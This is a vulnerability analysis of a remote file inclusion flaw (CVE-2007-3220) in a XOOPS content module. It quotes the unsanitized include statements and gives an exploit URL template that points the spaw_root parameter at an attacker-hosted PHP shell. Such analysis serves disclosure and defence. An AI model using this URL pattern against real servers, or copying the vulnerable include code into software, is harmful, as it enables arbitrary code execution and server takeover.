Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2007-3220

**Root Cause of Vulnerability:**
The vulnerability stems from a remote file inclusion issue within the `spaw_control.class.php` file of the Cjay Content 3 module for XOOPS CMS. This file includes other PHP files using a variable (`$spaw_root`) that is controllable by an attacker.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The primary vulnerability is the ability to include a remote file, making the application execute arbitrary code from a location controlled by the attacker.
- **Unsanitized Input:** The `$spaw_root` variable is not properly sanitized or validated, allowing the attacker to inject a URL.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** Successful exploitation allows the attacker to execute arbitrary PHP code on the server.
- **Full System Compromise:** Depending on the code injected, an attacker could gain complete control of the web server and potentially the entire system.

**Attack Vectors:**
- **HTTP GET Request:** The attacker sends a crafted HTTP GET request to the vulnerable script (`spaw_control.class.php`).
- **URL Manipulation:**  The attacker injects a malicious URL into the `spaw_root` parameter of the GET request.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs network access to the vulnerable web server.
- **Knowledge of Vulnerable Component:** The attacker needs knowledge of the vulnerable Cjay Content 3 module and its specific vulnerability in `spaw_control.class.php`.
- **Ability to send HTTP requests:** The attacker needs the ability to make HTTP GET requests to the target server.
- **Server Configuration:** For the exploit to work, the server needs to have the PHP settings `register_globals` enabled and `magic_quotes_gpc` disabled, according to the exploit details.

**Technical Details:**
- The vulnerable code snippet is in `/admin/editor2/spaw_control.class.php`:
```php
include $spaw_root.'config/spaw_control.config.php';
include $spaw_root.'class/toolbars.class.php';
include $spaw_root.'class/lang.class.php';
```
- The exploit URL is structured as follows:
  `http://[site]/modules/cjaycontent/admin/editor2/spaw_control.class.php?spaw_root=[shell_url]?`
  Where `[site]` is the vulnerable website, and `[shell_url]` is the location of the attacker's malicious PHP script.

**Additional Notes:**
- The provided exploit details mention the requirement for `register_globals` to be ON and `magic_quotes` to be OFF, which are deprecated and insecure PHP settings that should not be used in modern environments.
